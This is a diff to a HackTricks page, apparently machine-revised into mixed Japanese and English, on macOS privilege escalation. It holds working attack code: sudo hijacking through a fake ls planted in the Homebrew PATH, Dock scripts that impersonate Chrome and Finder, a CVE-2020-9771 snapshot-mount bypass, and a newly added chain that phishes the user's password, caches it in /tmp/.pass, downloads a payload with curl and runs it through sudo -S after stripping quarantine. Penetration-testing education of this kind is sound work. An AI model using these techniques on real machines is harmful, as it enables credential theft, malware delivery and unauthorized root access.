@@ -1,10 +1,10 @@
-# macOS 特権昇格
+# macOS Privilege Escalation
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## TCC 特権昇格
+## TCC Privilege Escalation
 
-TCC 特権昇格を探している場合は、次に進んでください:
+TCC privilege escalation をお探しであれば、次へ移動してください:
 
 
 {{#ref}}
@@ -13,20 +13,20 @@ macos-security-protections/macos-tcc/
 
 ## Linux Privesc
 
-**特権昇格に関するほとんどのトリックは、Linux/Unix に影響を与えるものは MacOS にも影響を与えることに注意してください。** したがって、次を参照してください:
+ご注意ください: **most of the tricks about privilege escalation affecting Linux/Unix will affect also MacOS** machines. なので、以下を参照してください:
 
 
 {{#ref}}
 ../../linux-hardening/privilege-escalation/
 {{#endref}}
 
-## ユーザーインタラクション
+## User Interaction
 
-### Sudo ハイジャック
+### Sudo Hijacking
 
-元の [Sudo ハイジャック技術は Linux 特権昇格の投稿内にあります](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking)。
+オリジナルは [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking) で見つけることができます。
 
-しかし、macOS は **`sudo`** を実行する際にユーザーの **`PATH`** を **保持** します。つまり、この攻撃を達成する別の方法は、被害者が **sudo を実行する際に実行する他のバイナリをハイジャックする** ことです:
+ただし、macOS はユーザーが **`sudo`** を実行したときにユーザーの **`PATH`** を **維持します**。つまり、この攻撃を達成する別の方法は、被害者が **running sudo** の際に実行する他のバイナリを **hijack other binaries** することです:
 ```bash
 # Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
 cat > /opt/homebrew/bin/ls <<EOF
@@ -41,17 +41,17 @@ chmod +x /opt/homebrew/bin/ls
 # victim
 sudo ls
 ```
-ユーザーがターミナルを使用している場合、**Homebrewがインストールされている**可能性が非常に高いです。したがって、**`/opt/homebrew/bin`**内のバイナリをハイジャックすることが可能です。
+Note that a user that uses the terminal will highly probable have **Homebrew installed**. So it's possible to hijack binaries in **`/opt/homebrew/bin`**.
 
-### Dockのなりすまし
+### Dock Impersonation
 
-いくつかの**ソーシャルエンジニアリング**を使用して、Dock内で**Google Chromeのなりすまし**を行い、実際に自分のスクリプトを実行することができます：
+いくつかの **social engineering** を用いることで、Dock 内で例えば **Google Chrome を偽装** し、実際に自分のスクリプトを実行させることができます:
 
 {{#tabs}}
 {{#tab name="Chrome Impersonation"}}
-いくつかの提案：
+いくつかの提案:
 
-- Dock内にChromeがあるか確認し、その場合はそのエントリを**削除**し、Dock配列の**同じ位置に****偽の**Chromeエントリを**追加**します。
+- Dock を確認して Chrome があるかどうか調べ、ある場合はそのエントリを**削除**し、Dock 配列の同じ位置に**偽の Chrome エントリを追加**します。
 ```bash
 #!/bin/sh
 
@@ -124,13 +124,13 @@ killall Dock
 {{#endtab}}
 
 {{#tab name="Finder Impersonation"}}
-いくつかの提案：
+いくつかの提案:
 
-- **DockからFinderを削除することはできない**ので、Dockに追加する場合は、偽のFinderを本物のすぐ隣に置くことができます。そのためには、**Dock配列の最初に偽のFinderエントリを追加する必要があります**。
-- 別のオプションは、Dockに置かずにただ開くことで、「FinderがFinderを制御するように求めています」はそれほど奇妙ではありません。
-- パスワードを尋ねることなく**rootに昇格する**別のオプションは、Finderに本当に特権アクションを実行するためのパスワードを要求させることです：
-- Finderに**`/etc/pam.d`**に新しい**`sudo`**ファイルをコピーするように依頼します（パスワードを尋ねるプロンプトは「Finderがsudoをコピーしたい」と示します）。
-- Finderに新しい**Authorization Plugin**をコピーするように依頼します（ファイル名を制御できるので、パスワードを尋ねるプロンプトは「FinderがFinder.bundleをコピーしたい」と示します）。
+- あなたは**FinderをDockから削除できません**。したがってDockに追加するなら、偽のFinderを本物のすぐ隣に置くことができます。そのためには、Dock配列の先頭に偽のFinderエントリを**追加する必要があります**。
+- もう一つの選択肢はDockに置かずに単に開くことです。"Finder asking to control Finder" はそれほど不自然ではありません。
+- もう一つの方法は、ひどいダイアログでパスワードを要求することなく**escalate to root without asking**することで、Finderに特権操作を実行するために実際にパスワードを尋ねさせることです:
+- Finderに**`/etc/pam.d`**へ新しい**`sudo`**ファイルをコピーさせる（パスワード入力を求めるプロンプトには "Finder wants to copy sudo" と表示されます）
+- Finderに新しい**Authorization Plugin**をコピーさせる（ファイル名を制御すれば、パスワード入力プロンプトに "Finder wants to copy Finder.bundle" と表示されます）
 ```bash
 #!/bin/sh
 
@@ -203,12 +203,33 @@ killall Dock
 {{#endtab}}
 {{#endtabs}}
 
-## TCC - ルート特権昇格
+### Password prompt phishing + sudo reuse
 
-### CVE-2020-9771 - mount_apfs TCC バイパスと特権昇格
+マルウェアはしばしばユーザーの操作を悪用して、**sudoが使えるパスワードを取得**し、それをプログラム的に再利用します。一般的なフロー:
 
-**任意のユーザー**（特権のないユーザーも含む）がタイムマシンのスナップショットを作成し、マウントして、そのスナップショットの**すべてのファイルにアクセス**できます。\
-必要な**特権**は、使用するアプリケーション（`Terminal`など）が**フルディスクアクセス**（FDA）アクセス（`kTCCServiceSystemPolicyAllfiles`）を持つことであり、これは管理者によって付与される必要があります。
+1. ログイン中のユーザを `whoami` で特定する。
+2. **パスワード入力プロンプトを繰り返し表示**して、`dscl . -authonly "$user" "$pw"` が成功するまで。
+3. 認証情報をキャッシュ（例: `/tmp/.pass`）し、`sudo -S`（標準入力経由でパスワード）で特権操作を実行する。
+
+最小限のチェーンの例:
+```bash
+user=$(whoami)
+while true; do
+read -s -p "Password: " pw; echo
+dscl . -authonly "$user" "$pw" && break
+done
+printf '%s\n' "$pw" > /tmp/.pass
+curl -o /tmp/update https://example.com/update
+printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
+```
+盗まれたパスワードはその後再利用され、**`xattr -c`で Gatekeeper の検疫を解除したり**、LaunchDaemons やその他の特権ファイルをコピーしたり、追加のステージを非対話的に実行したりできます。
+
+## TCC - Root 権限昇格
+
+### CVE-2020-9771 - mount_apfs TCC バイパスと権限昇格
+
+**任意のユーザー**（権限のないユーザーでも）は time machine のスナップショットを作成してマウントし、そのスナップショットの**全てのファイルにアクセス**できます。\
+必要な**唯一の特権**は、使用するアプリ（`Terminal`など）に**Full Disk Access** (FDA)（`kTCCServiceSystemPolicyAllfiles`）が与えられていることだけで、これは管理者によって付与される必要があります。
 ```bash
 # Create snapshot
 tmutil localsnapshot
@@ -228,15 +249,19 @@ mkdir /tmp/snap
 # Access it
 ls /tmp/snap/Users/admin_user # This will work
 ```
-より詳細な説明は[**元のレポートで見つけることができます**](https://theevilbit.github.io/posts/cve_2020_9771/)**。**
+詳しい説明は [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**
 
 ## 機密情報
 
-これは特権を昇格させるのに役立ちます：
+これは escalate privileges に役立ちます:
 
 
 {{#ref}}
 macos-files-folders-and-binaries/macos-sensitive-locations.md
 {{#endref}}
+
+## 参考文献
+
+- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
 
 {{#include ../../banners/hacktricks-training.md}}
